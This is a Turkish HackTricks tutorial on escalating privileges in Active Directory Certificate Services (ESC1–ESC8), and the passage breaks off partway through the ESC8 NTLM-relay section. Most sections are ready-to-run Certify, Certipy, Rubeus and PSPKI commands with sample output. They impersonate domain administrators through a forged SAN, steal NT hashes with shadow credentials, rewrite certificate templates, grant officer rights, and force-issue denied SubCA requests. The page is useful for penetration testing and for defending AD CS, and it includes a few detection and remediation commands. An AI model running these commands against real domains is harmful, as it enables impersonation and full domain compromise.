# AD CS Alan Adı Yetki Yükseltme

{{#include ../../../banners/hacktricks-training.md}}


**Bu, gönderilerdeki yetki yükseltme technique bölümlerinin bir özetidir:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Yanlış Yapılandırılmış Certificate Template'leri - ESC1

### Açıklama

### Yanlış Yapılandırılmış Certificate Template'leri - ESC1 Açıklaması

- **Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara enrolment hakları verilir.**
- **Manager onayı gerekli değildir.**
- **Yetkili personelden imza alınması gerekmez.**
- **Certificate template'lerindeki security descriptor'lar aşırı izin vericidir ve düşük ayrıcalıklı kullanıcıların enrolment hakları elde etmesine olanak tanır.**
- **Certificate template'ler authentication'ı kolaylaştıran EKU'ları tanımlayacak şekilde yapılandırılmıştır:**
- Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) veya EKU bulunmaması (SubCA) gibi Extended Key Usage (EKU) tanımlayıcıları dahil edilmiştir.
- **İstek sahiplerinin Certificate Signing Request (CSR) içine subjectAltName eklemesine template tarafından izin verilir:**
- Active Directory (AD), mevcut olması durumunda kimlik doğrulaması için certificate içindeki subjectAltName'i (SAN) önceliklendirir. Bu, bir CSR içinde SAN belirtilerek herhangi bir kullanıcının (ör. bir domain administrator) kimliğine bürünmek üzere certificate talep edilebileceği anlamına gelir. İstek sahibinin SAN belirtebilip belirtemeyeceği, certificate template'in AD object'i içindeki `mspki-certificate-name-flag` property'si tarafından belirtilir. Bu property bir bitmask'tir ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag'inin bulunması, SAN'ın istek sahibi tarafından belirtilmesine izin verir.

> [!CAUTION]
> Açıklanan yapılandırma, düşük ayrıcalıklı kullanıcıların istedikleri herhangi bir SAN ile certificate talep etmesine ve Kerberos veya SChannel üzerinden herhangi bir domain principal olarak authentication gerçekleştirmesine olanak tanır.

Bu özellik bazen ürünler veya deployment service'leri tarafından HTTPS veya host certificate'lerinin anında oluşturulmasını desteklemek için ya da yeterli bilgi sahibi olunmaması nedeniyle etkinleştirilir.

Bu seçenekle bir certificate oluşturulmasının bir warning tetiklediği belirtilmelidir. Ancak mevcut bir certificate template'in (örneğin `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` etkin olan `WebServer` template'inin) duplicate edilip authentication OID'i içerecek şekilde değiştirilmesi durumunda bu gerçekleşmez.

### Abuse

**Vulnerable certificate template'lerini bulmak** için şunu çalıştırabilirsiniz:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
**bir yöneticinin kimliğine bürünmek için bu zafiyeti kötüye kullanmak** amacıyla şu komut çalıştırılabilir:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Ardından oluşturulan **certificate'ı `.pfx`** formatına dönüştürebilir ve bunu tekrar **Rubeus veya certipy kullanarak authenticate olmak** için kullanabilirsiniz:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows ikili dosyaları olan "Certreq.exe" ve "Certutil.exe", PFX oluşturmak için kullanılabilir: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest'un yapılandırma şemasındaki sertifika şablonlarının; özellikle onay veya imza gerektirmeyen, Client Authentication ya da Smart Card Logon EKU'suna sahip olan ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağı etkinleştirilmiş şablonların enumeration işlemi, aşağıdaki LDAP sorgusu çalıştırılarak gerçekleştirilebilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Yanlış Yapılandırılmış Certificate Templates - ESC2

### Açıklama

İkinci abuse senaryosu, ilkinin bir varyasyonudur:

1. Enrollment hakları, Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara verilir.
2. Manager approval gereksinimi devre dışı bırakılır.
3. Authorized signatures gereksinimi kaldırılır.
4. Certificate template üzerindeki aşırı izinli bir security descriptor, düşük ayrıcalıklı kullanıcılara certificate enrollment hakları verir.
5. **Certificate template, Any Purpose EKU veya EKU olmamasını içerecek şekilde tanımlanır.**

**Any Purpose EKU**, bir saldırganın **client authentication, server authentication, code signing** vb. **herhangi bir amaç** için certificate edinmesine izin verir. **ESC3 için kullanılan tekniğin** aynısı bu senaryoyu exploit etmek için kullanılabilir.

**EKU içermeyen** ve subordinate CA certificate olarak işlev gören certificate'lar **herhangi bir amaçla** exploit edilebilir ve **yeni certificate'lar imzalamak için de kullanılabilir**. Bu nedenle saldırgan, subordinate CA certificate kullanarak yeni certificate'larda rastgele EKU'lar veya alanlar belirtebilir.

Ancak subordinate CA, varsayılan ayar olan **`NTAuthCertificates`** object'i tarafından trusted değilse, **domain authentication** için oluşturulan yeni certificate'lar çalışmaz. Bununla birlikte saldırgan, **herhangi bir EKU'ya** ve rastgele certificate değerlerine sahip **yeni certificate'lar** oluşturabilir. Bunlar potansiyel olarak geniş bir kullanım alanı için (ör. code signing, server authentication vb.) **abuse** edilebilir ve SAML, AD FS veya IPSec gibi network'teki diğer uygulamalar üzerinde önemli etkiler oluşturabilir.

AD Forest'ın configuration schema'sı içinde bu senaryoyla eşleşen template'ları enumerate etmek için aşağıdaki LDAP query çalıştırılabilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Yanlış Yapılandırılmış Enrollment Agent Şablonları - ESC3

### Açıklama

Bu senaryo birinci ve ikinci senaryoya benzer, ancak **farklı bir EKU'yu** (Certificate Request Agent) ve **2 farklı şablonu** kötüye kullanır (bu nedenle 2 farklı gereksinim kümesine sahiptir).

Microsoft dokümantasyonunda **Enrollment Agent** olarak bilinen **Certificate Request Agent EKU'su** (OID 1.3.6.1.4.1.311.20.2.1), bir principal'ın başka bir kullanıcı **adına bir sertifika için kayıt olmasına** olanak tanır.

**“Enrollment agent”**, böyle bir **şablona** kayıt olur ve ortaya çıkan **sertifikayı, diğer kullanıcı adına bir CSR'ı birlikte imzalamak için kullanır**. Ardından **birlikte imzalanmış CSR'ı**, **“enroll on behalf of” özelliğine izin veren** bir **şablona** kayıt olarak CA'ya gönderir ve CA, **“diğer” kullanıcıya ait bir sertifika** ile yanıt verir.

**Gereksinimler 1:**

- Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara enrollment hakları verilir.
- Yönetici onayı gereksinimi devre dışı bırakılmıştır.
- Yetkili imza gereksinimi yoktur.
- Sertifika şablonunun security descriptor'ı aşırı derecede izin vericidir ve düşük ayrıcalıklı kullanıcılara enrollment hakları verir.
- Sertifika şablonu, diğer principal'lar adına başka sertifika şablonları için request yapılmasını sağlayan Certificate Request Agent EKU'sunu içerir.

**Gereksinimler 2:**

- Enterprise CA, düşük ayrıcalıklı kullanıcılara enrollment hakları verir.
- Yönetici onayı atlatılmıştır.
- Şablonun schema version değeri 1'dir veya 2'den büyüktür ve Certificate Request Agent EKU'sunu gerektiren bir Application Policy Issuance Requirement belirtir.
- Sertifika şablonunda tanımlanan bir EKU, domain authentication'a izin verir.
- CA üzerinde enrollment agent kısıtlamaları uygulanmaz.

### Kötüye Kullanım

Bu senaryoyu kötüye kullanmak için [**Certify**](https://github.com/GhostPack/Certify) veya [**Certipy**](https://github.com/ly4k/Certipy) kullanabilirsiniz:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**enrollment agent sertifikası** **edinmesine** izin verilen **kullanıcılar**, **enrollment agent**'ların enrollment gerçekleştirmesine izin verilen şablonlar ve enrollment agent'ın adına hareket edebileceği **hesaplar**, enterprise CA'ler tarafından kısıtlanabilir. Bu işlem `certsrc.msc` **snap-in**'i açılarak, **CA'ye sağ tıklanıp**, **Properties**'e **tıklanarak** ve ardından “Enrollment Agents” sekmesine **gidilerek** gerçekleştirilir.

Ancak CA'ler için **varsayılan** ayarın “**Do not restrict enrollment agents**” olduğu belirtilmektedir. Yöneticiler enrollment agent kısıtlamasını etkinleştirip “Restrict enrollment agents” olarak ayarladığında bile varsayılan yapılandırma son derece izin vericidir. **Everyone**'ın tüm şablonlarda herkes adına enrollment gerçekleştirmesine izin verir.

## Vulnerable Certificate Template Access Control - ESC4

### **Açıklama**

**certificate template** üzerindeki **security descriptor**, belirli **AD principal**'larının şablonla ilgili sahip olduğu **izinleri** tanımlar.

Bir **attacker**, bir **template**'i **değiştirmek** ve **önceki bölümlerde** açıklanan herhangi bir **exploitable misconfiguration**'ı **uygulamak** için gerekli **izinlere** sahipse privilege escalation mümkün olabilir.

Certificate template'ler için geçerli önemli izinler şunlardır:

- **Owner:** Nesne üzerinde örtük denetim sağlar ve tüm attribute'ların değiştirilmesine olanak tanır.
- **FullControl:** Herhangi bir attribute'u değiştirme yeteneği de dahil olmak üzere nesne üzerinde tam yetki sağlar.
- **WriteOwner:** Nesnenin sahibinin attacker'ın kontrolündeki bir principal ile değiştirilmesine izin verir.
- **WriteDacl:** Access control'lerin ayarlanmasına ve potansiyel olarak attacker'sa FullControl verilmesine olanak tanır.
- **WriteProperty:** Herhangi bir nesne özelliğinin düzenlenmesine izin verir.

### Abuse

Template'ler ve diğer PKI nesneleri üzerinde düzenleme haklarına sahip principal'ları belirlemek için Certify ile enumeration gerçekleştirin:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Bir önceki örneğe benzer bir privesc örneği:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4, bir kullanıcının bir certificate template üzerinde write privileges sahibi olmasıdır. Bu durum, certificate template yapılandırmasının üzerine yazılarak template’in ESC1’e karşı vulnerable hâle getirilmesi gibi şekillerde abuse edilebilir.

Yukarıdaki path’te görebildiğimiz gibi, bu privileges yalnızca `JOHNPC` kullanıcısında mevcut; ancak `JOHN` kullanıcımızın `JOHNPC` üzerinde yeni `AddKeyCredentialLink` edge’i var. Bu technique certificates ile ilişkili olduğundan, [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) olarak bilinen bu attack’i de implement ettim. Aşağıda, victim’ın NT hash’ini almak için Certipy’nin `shadow auto` command’ına kısa bir preview görebilirsiniz.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy**, bir certificate template'ın yapılandırmasını tek bir komutla overwrite edebilir. **Varsayılan olarak**, yapılandırmayı **ESC1'e karşı vulnerable** olacak şekilde **overwrite** eder. Ayrıca **`-save-old` parametresini kullanarak eski yapılandırmayı kaydedebiliriz**; bu, saldırımızdan sonra yapılandırmayı **restore etmek** için yararlı olacaktır.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Güvenlik Açığı Bulunan PKI Object Access Control - ESC5

### Açıklama

Certificate Templates ve Certification Authority'nin ötesinde çeşitli nesneleri içeren, ACL tabanlı birbirine bağlı ilişkilerden oluşan kapsamlı ağ, tüm AD CS sisteminin güvenliğini etkileyebilir. Güvenliği önemli ölçüde etkileyebilen bu nesneler şunlardır:

- S4U2Self veya S4U2Proxy gibi mekanizmalar aracılığıyla ele geçirilebilecek CA sunucusunun AD computer object'i.
- CA sunucusunun RPC/DCOM server'ı.
- `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` içindeki belirli container path üzerinde bulunan tüm descendant AD object veya container'lar. Bu path; Certificate Templates container, Certification Authorities container, NTAuthCertificates object ve Enrollment Services Container gibi container ve object'leri içerir ancak bunlarla sınırlı değildir.

Düşük ayrıcalıklı bir attacker bu kritik bileşenlerden herhangi birinin kontrolünü ele geçirmeyi başarırsa PKI sisteminin güvenliği tehlikeye girebilir.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Açıklama

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage)'unda ele alınan konu, Microsoft tarafından açıklanan **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag'inin etkilerine de değinmektedir. Bir Certification Authority (CA) üzerinde etkinleştirildiğinde bu yapılandırma, Active Directory® üzerinden oluşturulanlar da dahil olmak üzere **herhangi bir request** içinde **user-defined values** kullanılmasına izin verir. Bu nedenle bir **intruder**, domain **authentication** için yapılandırılmış **herhangi bir template** üzerinden enrollment gerçekleştirebilir—standart User template gibi **unprivileged** kullanıcı enrollment'ına açık olanlar da dahil. Sonuç olarak bir certificate elde edilerek intruder'ın domain administrator veya domain içindeki **başka herhangi bir aktif entity** olarak authenticate olması sağlanabilir.

**Not**: `certreq.exe` içindeki `-attrib "SAN:"` argument'ı (”Name Value Pairs” olarak adlandırılır) aracılığıyla bir Certificate Signing Request (CSR)'a **alternative names** ekleme yöntemi, ESC1'deki SAN exploitation stratejisinden farklıdır. Buradaki fark, account information'ın nasıl kapsüllendiğidir—bir extension yerine certificate attribute içinde.

### Abuse

Ayarın etkin olup olmadığını doğrulamak için kuruluşlar `certutil.exe` ile aşağıdaki command'i kullanabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Bu işlem esasen **remote registry access** kullanır; dolayısıyla alternatif bir yaklaşım şu olabilir:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) ve [**Certipy**](https://github.com/ly4k/Certipy) gibi araçlar bu yanlış yapılandırmayı tespit edip istismar edebilir:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Bu ayarları değiştirmek için, **domain administrative** haklarına veya eşdeğer yetkilere sahip olunması koşuluyla aşağıdaki komut herhangi bir workstation üzerinden çalıştırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Bu yapılandırmayı ortamınızda devre dışı bırakmak için flag şu şekilde kaldırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Mayıs 2022 güvenlik güncellemelerinden sonra yayımlanan yeni **sertifikalar**, **istekte bulunan kişinin `objectSid` özelliğini** içeren bir **güvenlik uzantısı** barındıracaktır. ESC1 için bu SID, belirtilen SAN'dan türetilir. Ancak **ESC6** için SID, SAN'ı değil, **istekte bulunan kişinin `objectSid`** değerini yansıtır.\
> ESC6'yı exploit etmek için sistemin, **SAN'ı yeni güvenlik uzantısına göre önceliklendiren** ESC10'a (Weak Certificate Mappings) karşı savunmasız olması gerekir.

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Bir certificate authority için access control, CA eylemlerini yöneten bir dizi izin aracılığıyla sürdürülür. Bu izinler `certsrv.msc` açılarak, bir CA'ya sağ tıklanıp özellikler seçilerek ve ardından Security sekmesine gidilerek görüntülenebilir. Ayrıca izinler, aşağıdaki gibi komutlarla PSPKI module kullanılarak enumerate edilebilir:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Bu, sırasıyla “CA administrator” ve “Certificate Manager” rollerine karşılık gelen temel yetkiler olan **`ManageCA`** ve **`ManageCertificates`** hakkında bilgiler sağlar.

#### Abuse

Bir certificate authority üzerinde **`ManageCA`** yetkilerine sahip olmak, principal'ın PSPKI kullanarak ayarları uzaktan değiştirmesine olanak tanır. Buna, herhangi bir template'te SAN belirtimine izin vermek için **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag'inin etkinleştirilmesi de dahildir; bu, domain escalation açısından kritik bir unsurdur.

Bu işlemin basitleştirilmesi, doğrudan GUI etkileşimi olmadan değişiklik yapılmasına olanak tanıyan PSPKI'nin **Enable-PolicyModuleFlag** cmdlet'i kullanılarak sağlanabilir.

**`ManageCertificates`** yetkilerine sahip olmak, bekleyen isteklerin onaylanmasını sağlar ve böylece "CA certificate manager approval" güvenlik önlemini etkili bir şekilde atlatır.

Bir certificate istemek, onaylamak ve indirmek için **Certify** ve **PSPKI** modülleri birlikte kullanılabilir:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Saldırı 2

#### Açıklama

> [!WARNING]
> **önceki saldırıda**, **ESC6 saldırısını** gerçekleştirmek üzere **EDITF_ATTRIBUTESUBJECTALTNAME2** bayrağını **etkinleştirmek** için **`Manage CA`** izinleri kullanıldı, ancak CA hizmeti (`CertSvc`) yeniden başlatılana kadar bunun hiçbir etkisi olmayacaktır. Bir kullanıcı `Manage CA` erişim hakkına sahip olduğunda, kullanıcının **hizmeti yeniden başlatmasına** da izin verilir. Ancak bu, kullanıcının hizmeti **uzaktan yeniden başlatabileceği** anlamına gelmez. Ayrıca, Mayıs 2022 güvenlik güncelleştirmeleri nedeniyle çoğu yamalanmış ortamda E**SC6, varsayılan olarak çalışmayabilir**.

Bu nedenle burada başka bir saldırı sunulmaktadır.

Ön koşullar:

- Yalnızca **`ManageCA` izni**
- **`Manage Certificates`** izni (**`ManageCA`** üzerinden verilebilir)
- **`SubCA`** certificate template'i **etkinleştirilmiş** olmalıdır (**`ManageCA`** üzerinden etkinleştirilebilir)

Teknik, `Manage CA` _ve_ `Manage Certificates` erişim hakkına sahip kullanıcıların **başarısız certificate request'leri oluşturabilmesi** gerçeğine dayanır. **`SubCA`** certificate template'i **ESC1'e karşı savunmasızdır**, ancak template'e yalnızca **yöneticiler** enroll olabilir. Böylece bir **kullanıcı**, **reddedilecek** olan **`SubCA`** template'ine enroll olmak için **request** gönderebilir - ancak bu request daha sonra yönetici tarafından **issue edilebilir**.

#### Kötüye Kullanım

Kullanıcınızı yeni bir officer olarak ekleyerek **`Manage Certificates`** erişim hakkını kendinize **verebilirsiniz**.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** template'i `-enable-template` parametresiyle **CA** üzerinde **etkinleştirilebilir**. Varsayılan olarak `SubCA` template'i etkindir.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Bu saldırı için ön koşulları yerine getirdiysek, **`SubCA` şablonunu temel alan bir sertifika isteyerek** başlayabiliriz.

**Bu istek reddedilecek**, ancak özel anahtarı kaydedip istek kimliğini not edeceğiz.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`Manage CA` ve `Manage Certificates`** izinlerimizle, ardından `ca` komutunu ve `-issue-request <request ID>` parametresini kullanarak **başarısız sertifika** isteğini yayımlayabiliriz.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Ve son olarak, `req` komutu ve `-retrieve <request ID>` parametresiyle **düzenlenen sertifikayı alabiliriz**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Açıklama

Klasik ESC7 abuse yöntemlerine (EDITF attribute'larını etkinleştirme veya bekleyen request'leri onaylama) ek olarak, **Certify 2.0** yalnızca Enterprise CA üzerinde *Manage Certificates* (diğer adıyla **Certificate Manager / Officer**) rolünü gerektiren yepyeni bir primitive ortaya çıkardı.

`ICertAdmin::SetExtension` RPC method'u, *Manage Certificates* yetkisine sahip herhangi bir principal tarafından çalıştırılabilir. Bu method geleneksel olarak meşru CA'ler tarafından **pending** request'lerdeki extension'ları güncellemek için kullanılsa da, attacker bu method'u bir approval bekleyen request'e **varsayılan olmayan bir certificate extension** (örneğin `1.1.1.1` gibi özel bir *Certificate Issuance Policy* OID'si) **eklemek** için abuse edebilir.

Hedeflenen template bu extension için bir default value **tanımlamadığından**, request sonunda issue edildiğinde CA attacker-controlled value'yu **üzerine yazmaz**. Böylece ortaya çıkan certificate, attacker'ın seçtiği bir extension'ı içerir ve bu extension şunları sağlayabilir:

* Diğer vulnerable template'ların Application / Issuance Policy gereksinimlerini karşılamak (privilege escalation ile sonuçlanabilir).
* Certificate'a, third-party system'lerde beklenmedik trust sağlayan ek EKU'lar veya policy'ler enjekte etmek.

Kısacası, daha önce ESC7'nin “daha az güçlü” kısmı olarak kabul edilen *Manage Certificates*, artık CA configuration'a dokunmadan veya daha kısıtlayıcı *Manage CA* yetkisini gerektirmeden full privilege escalation ya da uzun vadeli persistence için kullanılabilir.

#### Certify 2.0 ile primitive'i abuse etme

1. **Pending kalacak bir certificate request gönderin.** Bu işlem, manager approval gerektiren bir template ile zorlanabilir:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. Yeni `manage-ca` command'ini kullanarak pending request'e özel bir extension **ekleyin**:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Template daha önce *Certificate Issuance Policies* extension'ını tanımlamıyorsa, yukarıdaki value issuance sonrasında korunur.*

3. Request'i **issue edin** (rolünüzde *Manage Certificates* approval yetkisi de varsa) veya bir operator'ün onaylamasını bekleyin. Issue edildikten sonra certificate'ı indirin:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Ortaya çıkan certificate artık malicious issuance-policy OID'sini içerir ve sonraki attack'lerde (ör. ESC13, domain escalation vb.) kullanılabilir.

> NOTE: Aynı attack, `ca` command'i ve `-set-extension` parameter'ı kullanılarak Certipy ≥ 4.7 ile de gerçekleştirilebilir.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Açıklama

> [!TIP]
> **AD CS'nin kurulu olduğu** ortamlarda, **vulnerable bir web enrollment endpoint'i** mevcutsa ve **domain computer enrollment ve client authentication'a izin veren en az bir certificate template yayınlanmışsa** (varsayılan **`Machine`** template'i gibi), **spooler service'i aktif olan herhangi bir computer attacker tarafından compromise edilebilir**!

AD CS tarafından çeşitli **HTTP-based enrollment method'ları** desteklenir; bunlar administrator'ların yükleyebileceği ek server role'leri aracılığıyla kullanıma sunulur. HTTP-based certificate enrollment için kullanılan bu interface'ler **NTLM relay attack'lerine** açıktır. Attacker, **compromise edilmiş bir machine'den inbound NTLM ile authenticate olan herhangi bir AD account'unu impersonate edebilir**. Attacker, victim account'unu impersonate ederken bu web interface'lerine erişerek `User` veya `Machine` certificate template'lerini kullanarak bir client authentication certificate isteyebilir.

- **Web enrollment interface** (`http://<caserver>/certsrv/` adresinde bulunan eski bir ASP application), varsayılan olarak yalnızca HTTP kullanır; bu da NTLM relay attack'lerine karşı koruma sağlamaz. Ayrıca Authorization HTTP header üzerinden yalnızca NTLM authentication'a açıkça izin verir ve bu nedenle Kerberos gibi daha güvenli authentication method'ları kullanılamaz.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service ve **Network Device Enrollment Service** (NDES), varsayılan olarak Authorization HTTP header üzerinden negotiate authentication'ı destekler. Negotiate authentication hem **Kerberos** hem de **NTLM** desteklediğinden, attacker relay attack'leri sırasında authentication'ı **NTLM'e downgrade edebilir**. Bu web service'leri varsayılan olarak HTTPS'i etkinleştirse de yalnızca HTTPS kullanılması **NTLM relay attack'lerine karşı koruma sağlamaz**. HTTPS service'lerinde NTLM relay attack'lerine karşı koruma ancak HTTPS channel binding ile birlikte kullanıldığında mümkündür. Ne yazık ki AD CS, channel binding için gerekli olan IIS üzerindeki Extended Protection for Authentication'ı etkinleştirmez.

NTLM relay attack'lerinde yaygın bir **issue**, NTLM session'larının **kısa ömürlü olması** ve attacker'ın **NTLM signing gerektiren service'lerle etkileşime girememesidir**.

Bununla birlikte bu kısıtlama, bir certificate edinmek için NTLM relay attack'inden yararlanılarak aşılabilir; çünkü session'ın süresini certificate'ın validity period'u belirler ve certificate, **NTLM signing zorunlu kılan service'lerle** kullanılabilir. Stolen certificate'ın nasıl kullanılacağına ilişkin talimatlar için bkz.:


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attack'lerinin bir diğer kısıtlaması, **attacker-controlled bir machine'in victim account tarafından authenticate edilmesi gerekmesidir**. Attacker ya bekleyebilir ya da bu authentication'ı **force** etmeyi deneyebilir:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)'nin `cas` command'i **enabled HTTP AD CS endpoint'lerini** enumerate eder:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` özelliği, kurumsal Certificate Authority'ler (CA'ler) tarafından Certificate Enrollment Service (CES) endpoint'lerini depolamak için kullanılır. Bu endpoint'ler, **Certutil.exe** aracı kullanılarak ayrıştırılabilir ve listelenebilir:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
